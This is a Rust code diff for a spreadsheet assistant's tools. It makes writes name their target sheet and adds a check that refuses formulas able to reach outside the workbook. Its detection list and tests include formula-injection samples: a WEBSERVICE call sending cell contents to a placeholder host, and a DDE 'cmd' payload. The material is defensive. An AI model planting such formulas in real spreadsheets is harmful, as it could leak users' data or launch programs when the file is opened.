@@ -39,15 +39,29 @@ pub fn run(
     }
 }
 
-/// The sheet a call names, by name (any case), or the one in front.
+/// The sheet a call names, by name (any case). A write must name it: the
+/// sheet in front when the call runs may not be the one the caller saw,
+/// since the user can switch sheets while a reply is being written. A read
+/// may leave it out and reads the sheet in front; its result names the
+/// sheet, so the caller sees which one it got, and nothing is changed.
 fn sheet_index(tab: &SheetTab, args: &Value) -> Result<usize, String> {
+    sheet_named(tab, args, false)
+}
+
+fn sheet_named(tab: &SheetTab, args: &Value, read: bool) -> Result<usize, String> {
     let workbook = tab.view.workbook();
     match args["sheet"]
         .as_str()
         .map(str::trim)
         .filter(|s| !s.is_empty())
     {
-        None => Ok(tab.view.sheet_index()),
+        None if read => Ok(tab.view.sheet_index()),
+        None => {
+            let names: Vec<&str> = workbook.sheets.iter().map(|s| s.name.as_str()).collect();
+            Err(format!(
+                "name the sheet with `sheet`; the sheets are {names:?}"
+            ))
+        }
         Some(name) => workbook
             .sheets
             .iter()
@@ -80,7 +94,7 @@ fn parse_range(text: &str) -> Option<CellRange> {
 }
 
 fn read(tab: &SheetTab, args: &Value) -> Result<String, String> {
-    let index = sheet_index(tab, args)?;
+    let index = sheet_named(tab, args, true)?;
     let workbook = tab.view.workbook();
     let sheet = &workbook.sheets[index];
     let used = sheet.used_range();
@@ -291,6 +305,77 @@ pub fn fingerprint(tab: &SheetTab, args: &Value) -> String {
     }
 }
 
+/// Why a formula could reach outside the workbook once the file is opened
+/// in Excel or LibreOffice, which would run it: `None` for one that cannot.
+/// Our engine runs none of these, but the saved file would. Looked for
+/// anywhere in the formula, string literals included, so the check errs on
+/// the side of refusing.
+pub fn reaches_outside(formula: &str) -> Option<&'static str> {
+    // Newer functions are stored with a prefix (`_xlfn.WEBSERVICE`).
+    let upper = formula
+        .to_uppercase()
+        .replace("_XLFN.", "")
+        .replace("_XLWS.", "");
+    const FUNCTIONS: &[(&str, &str)] = &[
+        ("WEBSERVICE(", "WEBSERVICE fetches a web address"),
+        ("FILTERXML(", "FILTERXML works on fetched data"),
+        ("HYPERLINK(", "HYPERLINK opens an address when clicked"),
+        ("RTD(", "RTD talks to another program"),
+        ("CALL(", "CALL runs code from a library"),
+        ("REGISTER.ID(", "REGISTER.ID loads code from a library"),
+        ("IMPORTXML(", "IMPORTXML fetches a web address"),
+        ("IMPORTDATA(", "IMPORTDATA fetches a web address"),
+        ("IMPORTHTML(", "IMPORTHTML fetches a web address"),
+        ("IMPORTFEED(", "IMPORTFEED fetches a web address"),
+        ("IMPORTRANGE(", "IMPORTRANGE reads another spreadsheet"),
+        ("IMAGE(", "IMAGE fetches a picture from an address"),
+    ];
+    for (name, why) in FUNCTIONS {
+        // A name, not the end of a longer one (`MYCALL(`).
+        let mut from = 0;
+        while let Some(at) = upper[from..].find(name).map(|at| at + from) {
+            let before = upper[..at].chars().next_back();
+            if !before.is_some_and(|c| c.is_alphanumeric() || c == '_' || c == '.') {
+                return Some(why);
+            }
+            from = at + name.len();
+        }
+    }
+    if formula.contains('|') {
+        return Some("a | is how DDE links to another program are written");
+    }
+    if formula.contains('[') || formula.contains(']') {
+        return Some("[…] is how other workbooks are referred to");
+    }
+    if formula.contains("\\\\") || formula.contains("//") {
+        return Some("it names a network share or a web address");
+    }
+    for scheme in ["HTTP:", "HTTPS:", "FILE:", "FTP:", "SMB:", "MAILTO:"] {
+        if upper.contains(scheme) {
+            return Some("it names an address outside the workbook");
+        }
+    }
+    None
+}
+
+/// The first entry that would write a formula reaching outside the
+/// workbook: its cell and why.
+fn outside_formula(start: CellRef, rows: &[Vec<String>]) -> Option<(CellRef, &'static str)> {
+    for (r, row) in rows.iter().enumerate() {
+        for (c, entry) in row.iter().enumerate() {
+            if let Some(formula) = entry.strip_prefix('=')
+                && let Some(why) = reaches_outside(formula)
+            {
+                return Some((
+                    CellRef::new(start.row + r as u32, start.col + c as u32),
+                    why,
+                ));
+            }
+        }
+    }
+    None
+}
+
 fn write(
     tab: &mut SheetTab,
     args: &Value,
@@ -302,6 +387,14 @@ fn write(
     let index = sheet_index(tab, args)?;
     let rows = entries(args)?;
     let range = target(args, &rows)?;
+    // Formulas that would reach outside once the file is opened elsewhere
+    // are never written for the assistant or a client, at any level: the
+    // user can type one themselves if they mean it.
+    if let Some((at, why)) = outside_formula(range.first, &rows) {
+        return Err(format!(
+            "nothing was written: the formula for {at} could reach outside the workbook ({why}); formulas like that are only entered by the user"
+        ));
+    }
     if index != tab.view.sheet_index() {
         tab.view.set_sheet(index);
     }
@@ -349,7 +442,7 @@ mod tests {
         // One full row and many empty ones: few entries, a huge range.
         let mut rows = vec![Value::Array(vec![Value::from("x"); 100])];
         rows.extend(std::iter::repeat_n(Value::Array(Vec::new()), 200));
-        let args = serde_json::json!({"start": "A1", "rows": rows});
+        let args = serde_json::json!({"sheet": "Sheet1", "start": "A1", "rows": rows});
         let wide = entries(&args).unwrap();
         assert!(target(&args, &wide).is_err());
         assert!(before_write(&tab(), &args).is_none());
@@ -366,6 +459,7 @@ mod tests {
             &mut tab,
             "write_cells",
             &json!({
+                "sheet": "Sheet1",
                 "start": "b2",
                 "rows": [["Item", "Price"], ["Tea", 3.5], ["Cake", "4"], ["Total", "=SUM(C3:C4)"]]
             }),
@@ -380,7 +474,7 @@ mod tests {
             &run(
                 &mut tab,
                 "read_sheet",
-                &json!({ "range": "A1:C5" }),
+                &json!({ "sheet": "Sheet1", "range": "A1:C5" }),
                 "en-US",
             )
             .unwrap()
@@ -393,7 +487,16 @@ mod tests {
         // The written range is selected, and one undo takes all of it back.
         assert_eq!(tab.view.selection().to_string(), "B2:C5");
         assert!(!tab.undo().is_empty());
-        let read = json(&run(&mut tab, "read_sheet", &json!({}), "en-US").unwrap().0);
+        let read = json(
+            &run(
+                &mut tab,
+                "read_sheet",
+                &json!({ "sheet": "Sheet1" }),
+                "en-US",
+            )
+            .unwrap()
+            .0,
+        );
         assert_eq!(read["rows"], json!([]));
     }
 
@@ -404,7 +507,7 @@ mod tests {
         let too_many = run(
             &mut tab,
             "write_cells",
-            &json!({ "start": "A1", "rows": rows }),
+            &json!({ "sheet": "Sheet1", "start": "A1", "rows": rows }),
             "en-US",
         );
         assert!(too_many.is_err());
@@ -412,11 +515,20 @@ mod tests {
         run(
             &mut tab,
             "write_cells",
-            &json!({ "start": "A1", "rows": rows }),
+            &json!({ "sheet": "Sheet1", "start": "A1", "rows": rows }),
             "en-US",
         )
         .unwrap();
-        let read = json(&run(&mut tab, "read_sheet", &json!({}), "en-US").unwrap().0);
+        let read = json(
+            &run(
+                &mut tab,
+                "read_sheet",
+                &json!({ "sheet": "Sheet1" }),
+                "en-US",
+            )
+            .unwrap()
+            .0,
+        );
         assert_eq!(read["used_range"], "A1:B300");
         // Without a range, the first 200 rows of the used range.
         assert_eq!(read["range"], "A1:B200");
@@ -424,7 +536,7 @@ mod tests {
             &run(
                 &mut tab,
                 "read_sheet",
-                &json!({ "range": "A1:Z1000" }),
+                &json!({ "sheet": "Sheet1", "range": "A1:Z1000" }),
                 "en-US",
             )
             .unwrap()
@@ -437,11 +549,35 @@ mod tests {
     #[test]
     fn bad_arguments_are_explained() {
         let err = |args: Value, tool: &str| run(&mut tab(), tool, &args, "en-US").unwrap_err();
-        assert!(err(json!({ "range": "nonsense" }), "read_sheet").contains("A1:D20"));
+        assert!(
+            err(
+                json!({ "sheet": "Sheet1", "range": "nonsense" }),
+                "read_sheet"
+            )
+            .contains("A1:D20")
+        );
         assert!(err(json!({ "sheet": "Nope" }), "read_sheet").contains("the sheets are"));
-        assert!(err(json!({ "start": "1A", "rows": [["x"]] }), "write_cells").contains("B2"));
-        assert!(err(json!({ "start": "A1", "rows": "x" }), "write_cells").contains("array"));
-        assert!(err(json!({ "start": "A1", "rows": [[{}]]}), "write_cells").contains("string"));
+        assert!(
+            err(
+                json!({ "sheet": "Sheet1", "start": "1A", "rows": [["x"]] }),
+                "write_cells"
+            )
+            .contains("B2")
+        );
+        assert!(
+            err(
+                json!({ "sheet": "Sheet1", "start": "A1", "rows": "x" }),
+                "write_cells"
+            )
+            .contains("array")
+        );
+        assert!(
+            err(
+                json!({ "sheet": "Sheet1", "start": "A1", "rows": [[{}]]}),
+                "write_cells"
+            )
+            .contains("string")
+        );
         assert!(err(json!({}), "replace_lines").contains("read_sheet"));
         let selection = json(
             &run(&mut tab(), "get_selection", &json!({}), "en-US")
@@ -454,7 +590,7 @@ mod tests {
     #[test]
     fn a_write_shows_what_it_replaces_and_notices_changes() {
         let mut tab = tab();
-        let args = json!({ "start": "A1", "rows": [["new", "=1+1"]] });
+        let args = json!({ "sheet": "Sheet1", "start": "A1", "rows": [["new", "=1+1"]] });
         let (sheet, range, now) = before_write(&tab, &args).unwrap();
         assert_eq!(
             (sheet.as_str(), range.to_string().as_str(), now.as_str()),
@@ -464,13 +600,92 @@ mod tests {
         run(
             &mut tab,
             "write_cells",
-            &json!({ "start": "B1", "rows": [["=2*3"]] }),
+            &json!({ "sheet": "Sheet1", "start": "B1", "rows": [["=2*3"]] }),
             "en-US",
         )
         .unwrap();
         assert_ne!(fingerprint(&tab, &args), before);
         assert_eq!(before_write(&tab, &args).unwrap().2, "\t=2*3");
         assert_eq!(as_rows(&entries(&args).unwrap()), "new\t=1+1");
+    }
+
+    #[test]
+    fn formulas_that_reach_outside_are_not_written() {
+        for formula in [
+            "WEBSERVICE(\"https://x.example/?\"&A1)",
+            "filterxml(B1,\"//a\")",
+            "HYPERLINK(\"https://x.example\",\"go\")",
+            "SUM([Other.xlsx]Sheet1!A1:A3)",
+            "'\\\\host\\share\\[b.xlsx]S'!A1",
+            "cmd|' /C calc'!A0",
+            "\"http://x.example\"",
+            "IMPORTXML(\"u\",\"x\")",
+            "_xlfn.WEBSERVICE(A1)",
+        ] {
+            assert!(reaches_outside(formula).is_some(), "{formula}");
+        }
+        for formula in [
+            "SUM(A1:A3)",
+            "B2*C2+B3*C3",
+            "MYCALL(1)",
+            "IF(A1>0,\"yes\",\"no\")",
+            "TEXT(A1,\"0.00\")",
+        ] {
+            assert_eq!(reaches_outside(formula), None, "{formula}");
+        }
+        let mut tab = tab();
+        let err = run(
+            &mut tab,
+            "write_cells",
+            &json!({ "sheet": "Sheet1", "start": "B2", "rows": [["ok", "=1+1"], ["=WEBSERVICE(\"https://x\")"]] }),
+            "en-US",
+        )
+        .unwrap_err();
+        assert!(
+            err.contains("B3") && err.contains("nothing was written"),
+            "{err}"
+        );
+        assert!(
+            !tab.is_modified(),
+            "nothing written, not even the safe cells"
+        );
+        // As text (no `=`), it is just text.
+        run(
+            &mut tab,
+            "write_cells",
+            &json!({ "sheet": "Sheet1", "start": "A1", "rows": [["WEBSERVICE(x)"]] }),
+            "en-US",
+        )
+        .unwrap();
+    }
+
+    #[test]
+    fn a_call_must_name_its_sheet() {
+        let mut tab = tab();
+        // Without a sheet, nothing is read or written on whatever is in front.
+        let err = run(
+            &mut tab,
+            "write_cells",
+            &json!({ "start": "A1", "rows": [["x"]] }),
+            "en-US",
+        )
+        .unwrap_err();
+        assert!(
+            err.contains("name the sheet") && err.contains("Sheet1"),
+            "{err}"
+        );
+        assert!(!tab.is_modified());
+        // A read without one reads the sheet in front, and says which.
+        let read = json(&run(&mut tab, "read_sheet", &json!({}), "en-US").unwrap().0);
+        assert_eq!(read["sheet"], "Sheet1");
+        // Any case.
+        run(
+            &mut tab,
+            "write_cells",
+            &json!({ "sheet": "sheet1", "start": "A1", "rows": [["x"]] }),
+            "en-US",
+        )
+        .unwrap();
     }
 
     #[test]
